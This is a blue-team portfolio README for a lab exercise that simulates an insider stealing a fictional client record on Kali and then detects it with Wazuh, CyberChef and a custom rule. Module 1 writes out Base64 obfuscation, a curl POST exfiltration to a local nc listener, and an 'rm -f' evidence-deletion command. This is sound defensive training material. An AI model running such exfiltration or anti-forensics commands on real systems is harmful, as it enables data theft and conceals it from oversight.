<div align="center">

# ⚔️ SOC Red vs Blue Capstone

**Project 13 of 18 — Blue Team Internship Portfolio**

Insider Threat Simulation · FIM Threat Hunting · Custom Detection Engineering · NIST IR

![Wazuh](https://img.shields.io/badge/Wazuh_Cloud-3AAFDA?style=for-the-badge)
![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK-C6501F?style=for-the-badge)
![NIST](https://img.shields.io/badge/NIST_SP_800--61-2E4053?style=for-the-badge)
![CyberChef](https://img.shields.io/badge/CyberChef-2EA043?style=for-the-badge)
![Cost](https://img.shields.io/badge/Cost-Free-2EA043?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=for-the-badge)

A full insider-threat attack simulated on one side, and investigated, decoded, and permanently detected on the other — including a detection rule that did not fire as expected, with the most likely cause identified and a compensating log source used instead of hiding the gap.

### [📑 Open the visual index](INDEX.md)

</div>

---

## 📑 Table of Contents

1. [At a Glance](#at-a-glance)
2. [Project Background](#project-background)
3. [Environment](#environment)
4. [Attack Chain](#attack-chain)
5. [Project Flow](#project-flow)
6. [Module 1 — Red Team Execution](#module-1)
7. [Module 2 — FIM Threat Hunting](#module-2)
8. [Module 3 — Decoding the Evidence](#module-3)
9. [Module 4 — Detection Engineering](#module-4)
10. [Module 5 — Containment, Eradication & Recovery](#module-5)
11. [Coverage Snapshot](#coverage-snapshot)
12. [Troubleshooting Pipeline](#troubleshooting-pipeline)
13. [Command Reference](#command-reference)
14. [Project Summary](#project-summary)
15. [Challenges & Fixes](#challenges-fixes)
16. [Scope & Limitations](#scope-limitations)
17. [What I Learned](#what-i-learned)
18. [Skills Demonstrated](#skills-demonstrated)
19. [Screenshot Index](#screenshot-index)
20. [Repo Structure](#repo-structure)

---

<a id="at-a-glance"></a>
## 📊 At a Glance

| 🧩 Attack Stages | 🖼️ Screenshots | 🎯 Custom Rules Written | 🔍 Detection Gaps Found | 💰 Cost |
|:---:|:---:|:---:|:---:|:---:|
| **4** | **5** | **1** | **1** | **$0** |

---

<a id="project-background"></a>
## 📖 Project Background

**What happened:** A simulated rogue employee ("insider threat") on a company endpoint accessed a confidential client database, disguised the file to avoid detection, sent it out of the company network to an external location, and then ran a command intended to delete the files and hide the evidence.

**What was done about it:** The full attack chain was reconstructed using File Integrity Monitoring (FIM) logs and system audit logs. The exact content of the disguised file was recovered and confirmed using a decoding tool. A new, permanent detection rule was written and tested so this specific technique will trigger an immediate high-priority alert if attempted again.

> [!IMPORTANT]
> **Platform substitution, disclosed directly:** The task brief specifies a Windows endpoint (PowerShell, `certutil.exe`, `C:\Espionage`). No functioning Windows VM was available after repeated setup failures (corrupted VM image, account lockout). The entire simulation was instead executed on a **Kali Linux** endpoint enrolled as a Wazuh agent, using direct Bash equivalents of every Windows command in the brief (`/root/Espionage` in place of `C:\Espionage`). Every detection concept, MITRE technique, and analysis step is unchanged — only the OS-specific syntax differs.

| Task Block | Status | Note |
|---|:---:|---|
| Phase One — Attack Simulation | 🟡 Partial | File staged, disguised, exfiltrated; `rm` command run, deletion not verified |
| Task 1 — FIM Threat Hunting | 🟡 Partial | File changes confirmed via rule 550; the `rm` command captured via sudo audit log (rule 5402); deletion itself not verified, rule 553 did not trigger |
| Task 2 — Decoding the Evidence | ✅ Complete | Disguised file content fully recovered via CyberChef |
| Task 3 — Detection Engineering | ✅ Complete | Custom rule 100050 written, deployed, and confirmed firing on a live test |

---

<a id="environment"></a>
## 🖧 Environment

| Item | Value |
|---|---|
| **Attack Platform** | Kali Linux (substituted for a Windows endpoint — see above) |
| **SIEM** | Fresh Wazuh Cloud trial environment |
| **Agent Name** | `kali-agent` |
| **Staging Directory** | `/root/Espionage` (substituted for `C:\Espionage`) |
| **FIM Mode** | `realtime` (`inotify`) in Exhibit 1; `whodata` + `auditd` enabled later (Exhibit 5 shows `whodata`) |
| **Exfiltration Method** | HTTP POST to a local listener (`nc -lvnp 8080`) |
| **Custom Rule** | 100050, Level 10, chained on parent rule 550, MITRE `T1027` |
| **Incident Date** | September 12, 2026, ~16:06–18:35 PKT |
| **IR Framework** | NIST SP 800-61 |

---

<a id="attack-chain"></a>
## 🔗 Attack Chain

```mermaid
%%{init: {'theme': 'base', 'themeVariables': {'fontSize': '14px'}, 'flowchart': {'nodeSpacing': 24, 'rankSpacing': 34, 'padding': 8}}}%%
flowchart LR
    S["1️⃣ Stage<br/>Client_Database.txt"]:::red --> O["2️⃣ Obfuscate<br/>Base64 → system_cache.b64"]:::red
    O --> E["3️⃣ Exfiltrate<br/>HTTP POST to listener"]:::red
    E --> D["4️⃣ Delete<br/>rm -f /root/Espionage/*"]:::red
    S -.->|Rule 550| F1["🔵 FIM creation alert"]:::blue
    O -.->|Rule 550| F1
    D -.->|Rule 553 — no event| G["⚠️ Open: deletion not verified"]:::gap
    D -.->|Rule 5402 — compensating control| F2["🔵 Sudo audit log of the rm command"]:::blue
    classDef red fill:#943126,stroke:#571C16,stroke-width:2px,color:#FFFFFF
    classDef blue fill:#117864,stroke:#083D33,stroke-width:2px,color:#FFFFFF
    classDef gap fill:#B7950B,stroke:#6B5807,stroke-width:2px,color:#FFFFFF
    linkStyle default stroke:#2C3E50,stroke-width:2px
```

---

<a id="project-flow"></a>
## ⏱️ Project Flow

```mermaid
%%{init: { 'theme': 'base', 'themeVariables': {
  'doneTaskBkgColor':'#117864', 'doneTaskBorderColor':'#083D33',
  'sectionBkgColor':'#D6DBDF', 'altSectionBkgColor':'#EAECEE',
  'taskTextColor':'#FFFFFF', 'taskTextOutsideColor':'#1B2631',
  'taskTextLightColor':'#FFFFFF',
  'titleColor':'#1B2A4A', 'fontSize':'18px'
}}}%%
gantt
    title Project Flow — Five Modules
    dateFormat YYYY-MM-DD
    axisFormat %b %d
    section Red Team
    Module 1 - Red team execution (stage-obfuscate-exfil-delete)  :done, 2026-09-12, 1d
    section Blue Team
    Module 2 - FIM threat hunting and timeline reconstruction     :done, 2026-09-12, 1d
    Module 3 - Decoding the exfiltrated evidence                  :done, 2026-09-12, 1d
    Module 4 - Custom detection rule engineering and live test    :done, 2026-09-12, 1d
    section Response
    Module 5 - Containment, eradication and recovery plan         :done, 2026-09-12, 1d
```

---

<a id="module-1"></a>
## 🔴 Module 1 — Red Team Execution

**Objective:** Execute the four-stage insider threat scenario exactly as specified — stage, obfuscate, exfiltrate, delete — generating the log evidence Module 2 investigates.

### Step 1 — Stage the confidential file ✅

```
echo 'CLIENT: Cyberster | ACCT: 4459 | PW: AdminPassword2026!' | \
sudo tee /root/Espionage/Client_Database.txt
```

### Step 2 — Obfuscate via Base64 encoding ✅

```
sudo base64 /root/Espionage/Client_Database.txt | \
sudo tee /root/Espionage/system_cache.b64
```

Functional equivalent of the brief's `certutil.exe -encode` step — both produce a Base64-encoded copy under an innocuous filename intended to blend in with legitimate system files.

### Step 3 — Exfiltrate over HTTP POST ✅

```
sudo nc -lvnp 8080                                              # listener (attacker side)
sudo curl -X POST --data-binary @/root/Espionage/system_cache.b64 \
  http://127.0.0.1:8080                                          # exfiltration (victim side)
```

The encoded payload was confirmed arriving intact at the listener (`Content-Length: 77`, Base64 body).

### Step 4 — Anti-forensics cleanup ⚠️

```
sudo rm -f /root/Espionage/*
```

The attacker's working assumption is that deleting the files destroys the evidence. Whether this command actually deleted anything was not verified — see Module 2, Step 6.

---

<a id="module-2"></a>
## 🔵 Module 2 — FIM Threat Hunting

**Objective:** Locate the log events proving each stage of the attack occurred, and build a timeline mapping each event to its file path, timestamp, agent, and user context.

### Step 5 — Confirm file changes via Rule 550 ✅

Filtering Discover to `rule.id: 550` returned FIM integrity-checksum alerts for both staged files, with full path, hash, and timing detail. Rule 550 is the *integrity checksum changed* (modified) rule: the events carry `mtime_before` values (for example 16:10:15 for `system_cache.b64`), so the files already existed from earlier attempts in the same session.

<p align="center">
  <img src="screenshots/ss-01-fim-creation-alerts-rule550.PNG" alt="Exhibit 1 - FIM creation alerts rule 550" width="850"><br>
  <em>Exhibit 1 (Figure 4.1) — Wazuh Discover, rule.id: 550. Two FIM events: <code>system_cache.b64</code> and <code>Client_Database.txt</code>, SHA1 hash, mtime, "Integrity checksum changed", tagged MITRE T1565.001</em>
</p>

### Step 6 — Investigate the deletion event ⚠️

The dedicated FIM deletion rule (553) was queried directly and **did not return a result**, despite `whodata` mode via `auditd` being correctly configured and its watch rule confirmed registered. This gap is treated as a genuine finding (see the Troubleshooting Pipeline), not concealed.

To see what was actually run, the **sudo command audit trail (rule 5402)** was queried instead, and returned the exact command line.

<p align="center">
  <img src="screenshots/ss-02-sudo-audit-deletion-rule5402.PNG" alt="Exhibit 2 - Sudo audit deletion log rule 5402" width="850"><br>
  <em>Exhibit 2 (Figure 4.2) — Wazuh Discover, rule.id: 5402 AND data.command: *rm*. One hit: <code>/usr/bin/rm -f /root/Espionage/*</code> executed by <code>malaikaazhar</code> via sudo — confirming the anti-forensics step with full command line and timestamp</em>
</p>

> [!WARNING]
> **Deletion not verified.** The command line logged in Exhibit 2 contains a literal `*` and was run from `/home/malaikaazhar/Desktop` by a non-root user. A non-root shell expands `*` before `sudo` runs, and `/root` is not readable to that user, so the pattern most likely reached `rm -f` unexpanded and removed nothing. This would explain why rule 553 had no deletion to report. Exhibit 5 is consistent with this: the later rule-550 event carries `mtime_before` 17:11:30, meaning `system_cache.b64` was still in the FIM baseline after the 17:44 `rm`. No directory listing was captured after the command, so this stays an open item. Re-test: `sudo bash -c 'rm -f /root/Espionage/*'`, then check `rule.id: 553`.

### 🕒 Reconstructed Timeline

| Attack Step | Evidence | File Path | Detection Method |
|---|---|---|---|
| 1. Stage file | syscheck event, rule 550 | `/root/Espionage/Client_Database.txt` | FIM (native) |
| 2. Obfuscate (Base64) | syscheck event, rule 550 | `/root/Espionage/system_cache.b64` | FIM (native) |
| 3. Exfiltrate | Listener capture + sudo audit log, rule 5402 | `/root/Espionage/system_cache.b64` | Network capture + command audit |
| 4. Delete evidence (attempted) | Sudo audit log, rule 5402 | `/root/Espionage/*` | Command audit only; deletion not verified (see Step 6) |

🎯 **Why a cleanup command would not erase the evidence:** Wazuh's FIM engine records file metadata (hash, size, owner, mtime) when a file is changed, and this record persists in the Manager's database independently of the file's later fate on disk. Separately, the OS's own command-execution logging (rule 5402) records the exact command run, regardless of whether the file-deletion-specific FIM rule also fires. Even a successful deletion removes the file from the filesystem, not from either of these two independent logging layers.

---

<a id="module-3"></a>
## 🟣 Module 3 — Decoding the Evidence

**Objective:** Prove not just that a file left the machine, but exactly what data it contained.

### Step 7 — Decode the captured payload in CyberChef ✅

The Base64 string captured at the attacker's listener was submitted to CyberChef's "From Base64" recipe.

<p align="center">
  <img src="screenshots/ss-03-cyberchef-base64-decode.PNG" alt="Exhibit 3 - CyberChef Base64 decode" width="850"><br>
  <em>Exhibit 3 (Figure 5.1) — CyberChef "From Base64" applied to the 76-byte captured payload. Output confirms the exact client record, account number, and password string that left the environment</em>
</p>

🎯 **Result:** This decoded output is the primary forensic proof of impact — it moves the finding from *"a file was sent externally"* to *"this exact client data was sent externally."*

**Cross-checks (recomputed, reproducible):**

| Check | Expected | Seen in |
|---|---|---|
| `Client_Database.txt` size | 56 bytes (55-character record + newline) | Exhibit 3 output (56) |
| `system_cache.b64` size | 77 bytes (76 Base64 characters + newline) | Exhibits 1 and 5 (`size_after: 77`), Exhibit 3 input (76) |
| `system_cache.b64` SHA1 | `960ce02b440d3584055fd349be4fc67a71009036` | Exhibits 1 and 5 (`sha1_after`) |

Reproduce: `printf 'CLIENT: Cyberster | ACCT: 4459 | PW: AdminPassword2026!\n' | base64 | sha1sum`

---

<a id="module-4"></a>
## 🟢 Module 4 — Detection Engineering

**Objective:** Ensure this specific technique — staging a Base64-obfuscated file inside a sensitive directory — generates an immediate, high-priority alert on any future occurrence.

### Step 8 — Author custom rule 100050 ✅

```xml
<group name="local,syscheck,">
<rule id="100050" level="10">
  <if_sid>550</if_sid>
  <field name="file" type="pcre2">\.b64$</field>
  <field name="file" type="pcre2">/root/Espionage</field>
  <description>Suspicious .b64 encoded file created in Espionage directory - possible data staging for exfiltration</description>
  <mitre><id>T1027</id></mitre>
  <group>data_exfiltration,</group>
</rule>
</group>
```

<p align="center">
  <img src="screenshots/ss-04-custom-rule-100050-source.PNG" alt="Exhibit 4 - Custom rule 100050 source" width="850"><br>
  <em>Exhibit 4 (Figure 6.1) — <code>local_rules.xml</code> as deployed in the Wazuh Rules editor: rule 100050 chained on parent rule 550, matching only <code>.b64</code> files inside <code>/root/Espionage</code>, Level 10, MITRE T1027</em>
</p>

The rule was deliberately set to **Level 10**: an encoded file appearing in this directory has effectively no legitimate business explanation once the parent FIM event and the filename/path conditions are all satisfied together — that's what justifies a real-time notification severity rather than a lower, log-only level.

### Step 9 — Verify the rule fires on a live re-test ✅

After deploying the rule and reloading the ruleset, Module 1's staging and encoding steps were re-executed to confirm the custom rule fires alongside the standard FIM alert.

<p align="center">
  <img src="screenshots/ss-05-custom-rule-100050-firing.PNG" alt="Exhibit 5 - Custom rule 100050 firing" width="850"><br>
  <em>Exhibit 5 (Figure 6.2) — Wazuh Discover, rule.id: 100050. One hit against <code>/root/Espionage/system_cache.b64</code> — verifying the rule is live, syntactically valid, and functioning as designed</em>
</p>

> [!NOTE]
> The hit in Exhibit 5 is a **modification** event (`mtime_before` 17:11:30, `mtime_after` 18:35:33), because the file already existed. Rule 100050 is chained on 550 (integrity checksum changed). A brand-new file should raise Wazuh's *file added* rule instead (554, verify with `sudo grep -rn 'rule id="554"' /var/ossec/ruleset/rules/`), so a first-time creation of a `.b64` file is not covered by the rule as deployed. This was not tested; adding `554` to the parent list is the next step.

🎯 **Why chain on `if_sid` 550 instead of writing an independent rule?** Chaining onto the parent FIM rule means this custom rule only ever evaluates events syscheck has already confirmed are genuine file integrity changes, inheriting its reliability without duplicating file-monitoring logic — the custom rule stays focused purely on the pattern that matters (extension + path).

---

<a id="module-5"></a>
## 🟡 Module 5 — Containment, Eradication & Recovery

**Objective:** Document how a real enterprise SOC would respond to this confirmed incident (not the lab steps performed above).

| Phase | Action |
|---|---|
| **Containment** | Suspend (not delete) the compromised account, preserving it for forensic review. Forcibly terminate active sessions. Restrict the endpoint to an isolated VLAN reachable only by IR — keeping it available for live forensic capture rather than powering it off, which would destroy volatile memory evidence. Block the destination IP/listener at the perimeter immediately. |
| **Eradication** | Check for newly created scheduled tasks/cron jobs, new or modified accounts, unauthorized SSH keys, and unauthorized startup services. Run a full AV/EDR scan. Recalculate the FIM baseline only after confirming no unauthorized changes remain. |
| **Recovery** | Reactivate the account only after a password reset and MFA enrollment, with HR/legal informed given the insider-threat nature. Return the endpoint to its normal network segment only after clean eradication checks and a follow-up FIM scan. Leave the custom rule (100050) permanently deployed and add this incident to the organization's detection test suite for periodic re-verification. |

---

<a id="coverage-snapshot"></a>
## 🌟 Coverage Snapshot

| 🛡️ Phase | ✅ Status | 📌 Detail |
|---|---|---|
| Red Team Execution | Partial | Stages 1–3 evidenced; stage 4 command run, deletion not verified |
| FIM Threat Hunting | Partial | File changes confirmed (550); `rm` command captured (5402); deletion not verified |
| Evidence Decoding | Complete | Exact exfiltrated content recovered via CyberChef |
| Detection Engineering | Complete | Rule 100050 written, deployed, and live-fire verified |
| IR Documentation | Written plan | NIST SP 800-61 containment, eradication and recovery plan — not exercised in the lab |
| FIM Deletion Rule (553) | Open | No event; likely because the `rm` pattern was never expanded — re-test pending |

### 🧾 What the Evidence Proves

```mermaid
%%{init: {'theme': 'base', 'themeVariables': {'fontSize': '14px'}, 'flowchart': {'nodeSpacing': 24, 'rankSpacing': 34, 'padding': 8}}}%%
flowchart LR
    M1["🔴 Module 1<br/>Red Team"]:::m1 --> P1["✅ Proven<br/>stages 1–3 executed"]:::ok
    M2["🔵 Module 2<br/>FIM Hunting"]:::m2 --> P2["✅ Proven<br/>file changes + rm command captured"]:::ok
    M2 --> N2["❌ Open<br/>deletion not verified"]:::bad
    M3["🟣 Module 3<br/>Decoding"]:::m3 --> P3["✅ Proven<br/>exact exfiltrated content"]:::ok
    M4["🟢 Module 4<br/>Detection"]:::m4 --> P4["✅ Proven<br/>rule 100050 fires live (modification event)"]:::ok
    classDef m1 fill:#943126,stroke:#571C16,stroke-width:2px,color:#FFFFFF
    classDef m2 fill:#117864,stroke:#083D33,stroke-width:2px,color:#FFFFFF
    classDef m3 fill:#76448A,stroke:#432752,stroke-width:2px,color:#FFFFFF
    classDef m4 fill:#1E8449,stroke:#0E4A28,stroke-width:2px,color:#FFFFFF
    classDef ok fill:#1E8449,stroke:#0E4A28,stroke-width:2px,color:#FFFFFF
    classDef bad fill:#943126,stroke:#571C16,stroke-width:2px,color:#FFFFFF
    linkStyle default stroke:#2C3E50,stroke-width:2px
```

---

<a id="troubleshooting-pipeline"></a>
## 🧭 Troubleshooting Pipeline

How the rule-553 deletion gap was diagnosed rather than assumed

```mermaid
flowchart TB
    Q1["❓ Was FIM active before file creation?"]:::q
    A1["✅ Yes — ruled out the most common cause"]:::ok
    Q2["❓ Was realtime/inotify sufficient for deletes?"]:::q
    A2["❌ No — switched to whodata"]:::bad
    Q3["❓ Was auditd running?"]:::q
    A3["❌ Initially no — installed and enabled it"]:::bad
    Q4["❓ Did Wazuh register the audit watch rule?"]:::q
    A4["✅ Yes — confirmed registered"]:::ok
    Q5["❓ Did rule 553 fire after all of the above?"]:::q
    A5["❌ Still no — traced to an unexpanded rm pattern (re-test pending)"]:::bad
    Comp["🔧 Compensating control: rule 5402 (sudo audit)"]:::fix

    Q1 --> A1 --> Q2 --> A2 --> Q3 --> A3 --> Q4 --> A4 --> Q5 --> A5 --> Comp

    classDef q fill:#2C3E70,stroke:#131B3A,stroke-width:3px,color:#FFFFFF,font-weight:bold
    classDef ok fill:#1E8449,stroke:#0E4A28,stroke-width:3px,color:#FFFFFF,font-weight:bold
    classDef bad fill:#943126,stroke:#571C16,stroke-width:3px,color:#FFFFFF,font-weight:bold
    classDef fix fill:#76448A,stroke:#432752,stroke-width:3px,color:#FFFFFF,font-weight:bold

    linkStyle default stroke:#2C3E50,stroke-width:3px
```

---

<a id="command-reference"></a>
## 🧰 Command Reference

| # | Command | Used In | Purpose |
|:---:|---|---|---|
| 1 | `echo '...' \| sudo tee Client_Database.txt` | Module 1 | Stage the confidential test file |
| 2 | `sudo base64 ... \| sudo tee system_cache.b64` | Module 1 | Obfuscate the file (equivalent of `certutil.exe -encode`) |
| 3 | `sudo nc -lvnp 8080` / `sudo curl -X POST --data-binary @...` | Module 1 | Exfiltration listener and HTTP POST send |
| 4 | `sudo rm -f /root/Espionage/*` | Module 1 | Anti-forensics cleanup attempt (glob not expanded for a non-root shell — see Module 2, Step 6) |
| 5 | `-w /root/Espionage -p wa -k wazuh_fim` | Module 2 / 4 | auditd watch rule enabling `whodata` monitoring |
| 6 | CyberChef "From Base64" | Module 3 | Decode the captured exfiltration payload |
| 7 | `<if_sid>550</if_sid>` + `pcre2` file match | Module 4 | Chain custom rule 100050 onto the parent FIM rule |
| 8 | `sudo bash -c 'rm -f /root/Espionage/*'` | Re-test (pending) | Delete with the glob expanded as root, then check rule 553 |

---

<a id="project-summary"></a>
## 📝 Project Summary

| Module | Tooling | Key Outcome |
|---|---|---|
| Module 1 — Red Team Execution | Bash, `base64`, `nc`, `curl` | Stages 1–3 executed on Kali (substituted for Windows); stage 4 command run, deletion not verified |
| Module 2 — FIM Threat Hunting | Wazuh Discover, rules 550 / 5402 | File changes confirmed natively; `rm` command captured via 5402; deletion not verified |
| Module 3 — Decoding the Evidence | CyberChef | Exact exfiltrated client data recovered and confirmed |
| Module 4 — Detection Engineering | `local_rules.xml`, rule 100050 | Permanent high-priority rule written, deployed, and live-fire verified |
| Module 5 — IR Documentation | NIST SP 800-61 | Written containment/eradication/recovery plan (not exercised in the lab) |

---

<a id="challenges-fixes"></a>
## ⚠️ Challenges & Fixes

| ❌ Challenge | ✅ Fix |
|---|---|
| No functioning Windows VM (corrupted image, account lockout) | Substituted Kali Linux with direct Bash equivalents of every Windows command — disclosed explicitly, not hidden |
| FIM deletion rule (553) did not fire despite correct `whodata`/`auditd` configuration | Diagnosed through a 5-step check sequence; used the sudo audit trail (rule 5402) as a compensating control; a later reading of Exhibit 2 showed the `rm` pattern was most likely never expanded, so the deletion itself is unverified (re-test pending) |
| Monitoring configuration had to be corrected twice mid-exercise before capturing every stage | Required several attempts across the session window; documented honestly rather than presented as friction-free |

---

<a id="scope-limitations"></a>
## 🚧 Scope & Limitations

- **Platform substitution:** Kali Linux was used in place of the specified Windows endpoint due to environment failures. All detection concepts and MITRE mappings are unchanged — only OS-specific syntax differs.
- **Deletion not verified, rule 553 not yet tested against a real deletion:** The logged `rm` command contains an unexpanded `*` (Exhibit 2), so nothing may have been deleted. Rule 553 has therefore not been shown to fail; a re-test with the glob expanded as root is pending.
- **Rule 100050 covers modification, not first-time creation:** It is chained on rule 550 (integrity checksum changed). A brand-new file raises the *file added* rule instead, which the rule does not cover. Untested.
- **IR plan is written, not exercised:** Module 5 describes how a real SOC would respond; it was not carried out in the lab.
- **Local listener, not a real external destination:** Exfiltration was demonstrated to `127.0.0.1:8080`, not an actual external network endpoint — sufficient to prove the technique and detection, not a real data-loss event.
- **Fictional test data only:** The "client record" staged and exfiltrated was fictional data created for this exercise, not real client information.

---

<a id="what-i-learned"></a>
## 🧠 What I Learned

- **A verified detection is worth more than a configured one.** The `whodata` configuration and registered audit rule looked correct at every check, yet rule 553 never fired, and the logged command later showed the test itself was flawed — a configuration step reporting success is not the same as a verified test.
- **Command-level audit logs are a necessary compensating control, not a nice-to-have.** This incident would have had an unverifiable deletion step without the sudo audit trail also being monitored — a mature SOC should never depend on a single log source for a critical event category.
- **A platform substitution should be disclosed, not hidden.** Running on Kali instead of Windows doesn't change the underlying concepts being tested, but it's stated explicitly at the point it occurred.
- **A command can succeed and still do nothing.** `sudo rm -f /root/Espionage/*` returns no error even when the shell never expands the `*` — the logged command line (Exhibit 2) is what revealed it.
- **Deleting a file doesn't delete its evidence.** FIM metadata and command-execution logs are independent of the file's fate on disk — an attacker's cleanup step removes the file, not the two separate log trails that already recorded it.
- **Chaining a custom rule on a parent rule keeps detection logic honest.** Rule 100050 only evaluates events syscheck already confirmed as genuine — it doesn't duplicate detection logic, it narrows an already-reliable signal.

---

<a id="skills-demonstrated"></a>
## 🛠️ Skills Demonstrated

- Executing an insider-threat attack chain (staging, obfuscation, exfiltration) on a Kali endpoint
- FIM-based threat hunting and cross-log timeline reconstruction
- Diagnosing a non-firing detection rule through a methodical, documented check sequence
- Using a compensating control (command-level audit) when a primary detection mechanism fails
- Forensic Base64 decoding to confirm exact data impact
- Writing and live-verifying a custom Wazuh rule chained on a parent FIM rule, mapped to MITRE ATT&CK
- Structuring a written incident response plan around NIST SP 800-61 (containment, eradication, recovery)
- Disclosing environment substitutions and unresolved gaps directly rather than concealing them

---

<a id="screenshot-index"></a>
## 🖼️ Screenshot Index

| # | File | Shows |
|:---:|---|---|
| 1 | `ss-01-fim-creation-alerts-rule550.PNG` | Rule 550 FIM creation alerts for both staged files |
| 2 | `ss-02-sudo-audit-deletion-rule5402.PNG` | Rule 5402 sudo audit log confirming the `rm -f` deletion |
| 3 | `ss-03-cyberchef-base64-decode.PNG` | CyberChef decoding the exfiltrated payload |
| 4 | `ss-04-custom-rule-100050-source.PNG` | Custom rule 100050 source in the Wazuh Rules editor |
| 5 | `ss-05-custom-rule-100050-firing.PNG` | Rule 100050 confirmed firing on a live re-test |

---

<a id="repo-structure"></a>
## 📁 Repo Structure

```text
project-13-soc-redvsblue-capstone/
|-- README.md
|-- INDEX.md
`-- screenshots/
    |-- ss-01-fim-creation-alerts-rule550.PNG
    |-- ss-02-sudo-audit-deletion-rule5402.PNG
    |-- ss-03-cyberchef-base64-decode.PNG
    |-- ss-04-custom-rule-100050-source.PNG
    `-- ss-05-custom-rule-100050-firing.PNG
```

<div align="center">

🛡️ **[Wazuh](https://wazuh.com)** · 🐉 **[Kali Linux](https://www.kali.org)** · 🧪 **[CyberChef](https://gchq.github.io/CyberChef/)** · 🧭 **[MITRE ATT&CK](https://attack.mitre.org)** · 📘 **[NIST SP 800-61](https://csrc.nist.gov/pubs/sp/800/61/r2/final)** · 🧭 **[Troubleshooting Pipeline](#troubleshooting-pipeline)**

</div>
